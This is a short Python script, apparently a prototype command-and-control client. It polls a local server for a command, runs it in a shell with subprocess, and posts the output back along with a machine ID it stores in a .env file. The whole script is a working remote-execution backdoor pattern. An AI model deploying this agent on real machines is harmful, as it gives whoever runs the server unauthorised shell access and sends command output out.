import uuid
import requests
import subprocess
from dotenv import dotenv_values, set_key
from time import sleep
from datetime import datetime


api_url = "http://127.0.0.1:5000"


def execute_cmd_from_server(machinde_id: str) -> None:
    cmd = requests.get(f"{api_url}/{machinde_id}/api")
    curr_time = datetime.now().strftime("%H:%M:%S")
    if cmd.text != "nothing_to_execute":
        output = subprocess.getoutput(cmd.text)
        data: dict = {"time": curr_time, "cmd": cmd.text, "output": output}
        requests.post(f"{api_url}/{machinde_id}/api", json=data)


if __name__ == "__main__":
    config = dotenv_values(".env")
    machinde_id = config.get("machinde_id")
    if machinde_id is None:
        machinde_id = str(uuid.uuid4())
        set_key(".env", "machinde_id", machinde_id)

    execute_cmd_from_server(machinde_id)
    # sleep(2)
    # execute_cmd_from_server("cmd2")
